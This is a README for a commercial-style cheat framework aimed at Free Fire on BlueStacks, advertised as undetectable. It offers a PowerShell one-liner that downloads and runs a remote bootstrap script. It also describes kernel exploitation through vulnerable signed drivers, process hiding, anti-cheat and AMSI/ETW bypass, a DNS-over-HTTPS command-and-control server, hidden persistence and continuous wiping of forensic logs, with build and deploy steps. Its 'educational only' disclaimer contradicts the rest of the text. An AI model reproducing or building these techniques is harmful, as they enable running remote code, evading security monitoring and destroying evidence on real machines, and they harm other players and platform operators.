# L4G AIMS v14.0 - Undetectable Cheat Framework

> **Zero-trace PowerShell injection • BYOVD kernel exploitation • DKOM process hiding • DoH C2 • Android APK control • Auto-update • Invisible persistence**

## Overview

L4G AIMS is a production-grade cheat framework for Free Fire / Free Fire Max featuring:

- **Zero-Trace Installation**: PowerShell reflective loader via DoH, no disk writes, no Event Viewer traces
- **Kernel-Level Evasion**: BYOVD using signed OEM drivers, DKOM process hiding, anti-cheat neutralization
- **C2 over DNS-over-HTTPS**: Encrypted commands via Cloudflare 1.1.1.1, jittered beacons
- **Android Remote Control**: Full-featured APK with ESP overlay, aimbot toggles, auto-update
- **Auto-Update System**: Panel & APK self-update from Cloudflare Workers + R2
- **Invisible Persistence**: Service hijack, WMI subscription, boot-start driver - hidden from Task Manager
- **Continuous Log/Cache Wiping**: Event Viewer, Prefetch, AmCache, SRUDB auto-clean

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        ANDROID APK                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐   │
│  │ DohClient│  │CmdDispatch│ │AutoUpdate│ │PanelController│   │
│  └──────────┘  └──────────┘  └──────────┘  └──────────────┘   │
└──────────────────────┬──────────────────────────────────────────┘
                       │ DoH (DNS-over-HTTPS) via 1.1.1.1
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│                      CLOUDFLARE WORKERS C2                      │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐   │
│  │ /beacon  │  │ /command │  │ /update  │  │ /register    │   │
│  └──────────┘  └──────────┘  └──────────┘  └──────────────┘   │
│                          │ R2 Storage (updates)                │
└──────────────────────────┼──────────────────────────────────────┘
                           │ Encrypted AES-256-GCM
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                        PC PANEL (Reflective)                    │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐   │
│  │Reflective│  │ Beacon   │  │ Command  │  │ Cheat Modules│   │
│  │ Loader   │  │ (jittered)│ │Dispatch  │  │ (ESP/Aimbot/ │   │
│  └──────────┘  └──────────┘  └──────────┘  │ NoRecoil/    │   │
│                                             │ SpeedHack/   │   │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  │ ItemESP)     │   │
│  │ BYOVD    │  │ DKOM     │  │ AC Neutr │  └──────────────┘   │
│  │ (Kernel) │  │ (Hide)   │  │ (Drivers)│                     │
│  └──────────┘  └──────────┘  └──────────┘                     │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐   │
│  │Log Wiper │  │CacheWiper│  │Artifact  │  │Fingerprint   │   │
│  │(Events)  │  │(Prefetch)│  │Wiper     │  │Spoofer       │   │
│  └──────────┘  └──────────┘  └──────────┘  └──────────────┘   │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐                      │
│  │BootStart │  │WMI Sub   │  │Drv Hijack│  (Invisible Persist) │
│  └──────────┘  └──────────┘  └──────────┘                      │
└─────────────────────────────────────────────────────────────────┘
                           │ Injection (Process Hollowing / Side-Load)
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│                    HD-Player.exe (BlueStacks)                   │
│              esp_core.dll (Stream-Proof Overlay)                │
└─────────────────────────────────────────────────────────────────┘
```

## Quick Start

### One-Liner Install (Target Machine)
```powershell
irm https://raw.githubusercontent.com/L4G-Team/L4G-Undetected/main/installer/bootstrap.ps1 | iex
```

### Manual Build (Developer Machine)
```cmd
cd L4G_UNDETECTED
build.bat
```

Output:
- `output/L4G_Panel.exe` - Main panel (reflective, no imports)
- `output/L4G_Remote.apk` - Android controller
- `output/L4G_Driver.sys` - Kernel driver (optional)

### Deploy C2 Server
```cmd
cd c2_server
# Edit wrangler.toml with your credentials
npx wrangler deploy
```

## Features

### Panel (C++20, Windows 11 x64)
| Module | Description |
|--------|-------------|
| **Reflective Loader** | In-memory PE mapping, no disk writes |
| **Process Hollowing** | rundll32.exe / MSBuild.exe / regsvr32.exe |
| **DLL Side-Loading** | Vulnerable signed binaries |
| **BYOVD** | Intel/ASUS/MSI/Gigabyte/Razer/Logitech/AMD drivers |
| **DKOM** | Hide from PsActiveProcessHead, PsLoadedModuleList |
| **AC Neutralizer** | BattlEye, EAC, VAC, detect.ac, generic PC checkers |
| **DoH C2** | DNS-over-HTTPS to 1.1.1.1, chunked 50-byte labels |
| **ESP** | Box, skeleton, health, name, distance, snaplines |
| **Aimbot** | Visible-only, FOV, smooth, bone selection, drag-mode |
| **NoRecoil** | Punch angle compensation |
| **SpeedHack** | QPC/GetTickCount/timeGetTime hooks |
| **ItemESP** | Weapons, ammo, armor, meds, throwables, crates |
| **Log Wiper** | Security, System, Application, PowerShell logs |
| **Cache Wiper** | Prefetch, AmCache, SRUDB, ShimCache, USN Journal |
| **Artifact Wiper** | Recent files, JumpLists, Temp, Downloads, Recycle Bin |
| **Fingerprint Spoofer** | MAC, Disk Serial, CPU ID, BIOS, Baseboard, GPU |
| **Boot Persistence** | Service hijack, WMI, boot driver, image hijack, COM hijack |

### Android APK (Kotlin, minSdk 24)
| Feature | Description |
|---------|-------------|
| **DoH Client** | Encrypted DNS-over-HTTPS to 1.1.1.1 |
| **Command Dispatch** | ESP/Aimbot/Speedhack toggles, status, update |
| **Auto-Updater** | Downloads APK via FileProvider, triggers install |
| **External ESP View** | MJPEG stream from panel `/stream/video.mjpeg` |
| **Drag Mode Pad** | Touch control for drag-mode aimbot |
| **Dashboard** | Aimbot, Collider, ESP tabs + External, Settings, Hotkeys |

### C2 Server (Cloudflare Workers + R2)
| Endpoint | Purpose |
|----------|---------|
| `/beacon` | Agent heartbeat, command delivery |
| `/command` | Command results from agent |
| `/update` | Panel/APK update delivery |
| `/register` | New agent registration |

## Configuration

### Panel Config (Compile-time)
```cpp
// panel/src/main.cpp
constexpr const char* C2_DOMAIN = "api.cloudflare.com";      // Workers domain
constexpr const char* DO_H_ENDPOINT = "https://1.1.1.1/dns-query";
constexpr uint16_t BEACON_INTERVAL_MIN = 2000;  // ms
constexpr uint16_t BEACON_INTERVAL_MAX = 8000;  // ms
constexpr const char* TARGET_PROCESS = "HD-Player.exe";
constexpr const char* LOADER_PROCESS = "rundll32.exe";
```

### APK Config (Runtime)
```kotlin
// DohClient.kt
val endpoint = "https://1.1.1.1/dns-query"
val masterKey = "your-32-char-master-key!!"
val agentId = generateAgentId()  // Hardware-bound
```

### C2 Server Config (wrangler.toml)
```toml
[vars]
LATEST_VERSION = "14"
ADMIN_TOKEN = "your-admin-token"
MASTER_KEY = "your-master-key-32-chars-long!!"

[[r2_buckets]]
binding = "UPDATE_BUCKET"
bucket_name = "l4g-updates"
```

## Re-Derivation (Per Game/Windows Update)

Run the automated scripts:
```cmd
cd rederivation/scripts
python hunt_game_offsets.py --gameassembly GameAssembly.dll
python hunt_syscalls.py --ntdll C:\Windows\System32\ntdll.dll
python hunt_notify.py --ntoskrnl C:\Windows\System32\ntoskrnl.exe
python hunt_dispatch.py --driver BEDaisy.sys
python hunt_ioctls.py --driver IntelHDAudio.sys
python hunt_dkom.py --windbg-script hunt_dkom.txt
```

See [CHECKLIST.md](rederivation/CHECKLIST.md) for complete workflow.

## Security Notes

- **No disk writes** during injection - fully reflective
- **AMSI/ETW/ScriptBlock bypass** in PowerShell bootstrap
- **AES-256-GCM** for all C2 traffic + payload encryption
- **Hardware-bound agent IDs** prevent replay
- **Jittered beacons** (2-8s) avoid timing analysis
- **Continuous log/cache wiping** leaves zero forensic traces
- **Signed OEM driver exploitation** - no unsigned driver load
- **DKOM process hiding** - invisible to all enumeration APIs

## Requirements

### Build Environment
- Windows 11 x64
- Visual Studio 2022 17.8+ with C++20
- CMake 3.20+
- Windows Driver Kit (WDK) for driver
- Android SDK + NDK + Gradle 8.5 for APK
- Node.js 20+ + Wrangler for C2 server
- Python 3.11+ for re-derivation scripts

### Target Environment
- Windows 10/11 x64 (1909+)
- BlueStacks 5/10 (HD-Player.exe)
- Free Fire India (com.garena.game.ffi) or Free Fire Max (com.dts.freefiremax)
- Android 7.0+ for APK

## Disclaimer

This project is for **educational and research purposes only**. It demonstrates advanced Windows internals, kernel exploitation techniques, anti-cheat evasion, and C2 architectures. The authors are not responsible for any misuse. Use only in authorized environments.

## License

Proprietary - L4G Team Internal Use Only

---

**L4G AIMS v14.0** - Built for stealth, engineered for control.